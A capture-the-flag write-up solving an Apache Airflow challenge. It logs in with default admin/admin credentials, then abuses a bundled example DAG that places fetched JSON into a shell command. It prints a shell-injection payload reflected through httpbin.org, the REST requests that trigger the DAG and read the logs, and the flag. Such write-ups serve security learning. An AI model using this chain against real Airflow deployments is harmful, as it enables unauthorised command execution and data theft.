# nday-1

`nday-1` is an Apache Airflow deployment left in a very CTF-friendly state:

- the web login uses the stock Airflow auth flow
- the challenge accepts the default `admin/admin` credentials
- example DAGs are still enabled
- one of those example DAGs builds a shell command from attacker-controlled data

That is enough for authenticated remote code execution through a normal DAG run, and the flag drops straight into the task logs.

Final flag:

```text
CTF{2539590147b12b33dfd9d0bc65c86aec525af4d4dd9c997258d57b09c9adf16d}
```

## Surface Triage

The collected artifacts already show the shape of the target:

- `login.html` is the Airflow login page under `/auth/login/`
- `login_post_headers.txt` shows a successful login redirects to `/auth/`
- `cookies.txt` contains an Airflow `_token` JWT cookie
- `eventlogs.json` shows the admin user being created at startup
- `dags.json` shows 78 bundled example DAGs enabled in production

The important event log entry is:

```text
airflow users create --username admin --password ******** --role Admin
```

So the first step is simply logging in as:

```text
admin / admin
```

## Step 1: Get API Access

Airflow's UI login is form-based, not pure API auth.

The working sequence is:

1. `GET /auth/login/`
2. extract the CSRF token from the HTML form
3. `POST /auth/login/` with `username=admin&password=admin`
4. `GET /auth/`

That last request is important because it causes Airflow to issue the SPA JWT in the `_token` cookie. The API then accepts:

```text
Authorization: Bearer <_token cookie>
```

## Step 2: Find A Runnable Example DAG

`dags.json` shows that the deployment exposes the stock example bundle, including:

```text
example_dag_decorator
```

with source file:

```text
/opt/venv/lib/python3.12/site-packages/airflow/example_dags/example_dag_decorator.py
```

The vulnerable code path is:

```python
class GetRequestOperator(BaseOperator):
    template_fields = ("url",)

    def execute(self, context):
        return httpx.get(self.url).json()

@task(multiple_outputs=True)
def prepare_command(raw_json):
    external_ip = raw_json["origin"]
    return {
        "command": f"echo 'Seems like today your server executing Airflow is connected from IP {external_ip}'",
    }

BashOperator(task_id="echo_ip_info", bash_command=command_info["command"])
```

This is the whole bug:

1. the DAG fetches attacker-controlled JSON from a user-controlled URL
2. it reads `raw_json["origin"]`
3. it interpolates that value directly into a shell command
4. `BashOperator` executes the resulting string with shell semantics

So if `origin` contains a single quote, we break out of the quoted `echo` string and inject commands.

## Step 3: Supply Malicious JSON

The easiest reflector is `httpbin`:

```text
https://httpbin.org/response-headers?origin=<payload>
```

The payload used in the solver is:

```text
';cat /flag.txt;#
```

After URL encoding, Airflow fetches JSON equivalent to:

```json
{"origin":"';cat /flag.txt;#"}
```

That makes the final shell command look like:

```bash
echo 'Seems like today your server executing Airflow is connected from IP ';cat /flag.txt;#'
```

The trailing `#` comments out the dangling quote, so the command executes cleanly and prints `/flag.txt`.

## Step 4: Trigger The DAG Over The REST API

With the JWT cookie copied into an `Authorization` header, trigger the DAG:

```http
POST /api/v2/dags/example_dag_decorator/dagRuns
```

using a body like:

```json
{
  "dag_run_id": "manual__solve_<timestamp>",
  "logical_date": "2026-03-06T12:34:00Z",
  "conf": {
    "url": "https://httpbin.org/response-headers?origin=%27%3Bcat%20%2Fflag.txt%3B%23"
  }
}
```

For this example DAG, the `conf.url` value is bound to the `url` parameter of the decorated DAG, so `GetRequestOperator` fetches our malicious endpoint.

## Step 5: Read The Flag From Task Logs

Once the DAG run finishes, poll:

```text
/api/v2/dags/example_dag_decorator/dagRuns/<run_id>/taskInstances
```

until `echo_ip_info` reaches `success` or `failed`.

Then fetch:

```text
/api/v2/dags/example_dag_decorator/dagRuns/<run_id>/taskInstances/echo_ip_info/logs/1?full_content=true
```

The command output is embedded in the returned log events, and one of those lines contains:

```text
CTF{2539590147b12b33dfd9d0bc65c86aec525af4d4dd9c997258d57b09c9adf16d}
```

## Why This Works

This challenge does not require a framework memory corruption bug or auth bypass. The deployment is vulnerable because it combines:

- default administrator credentials
- exposed example DAGs
- an example DAG that treats attacker-controlled JSON as trusted shell data

Once authenticated, the REST API gives everything needed to trigger the DAG and read back the logs.

## Solver

[solve_nday_1.py](./solve_nday_1.py) automates the full chain:

1. log in with `admin/admin`
2. collect the `_token` JWT
3. trigger `example_dag_decorator` with a malicious `conf.url`
4. poll `echo_ip_info`
5. scrape the flag from the logs

Usage:

```bash
python3 solve_nday_1.py --url http://host:port
```

On the remote instance, the recovered flag is:

```text
CTF{2539590147b12b33dfd9d0bc65c86aec525af4d4dd9c997258d57b09c9adf16d}
```
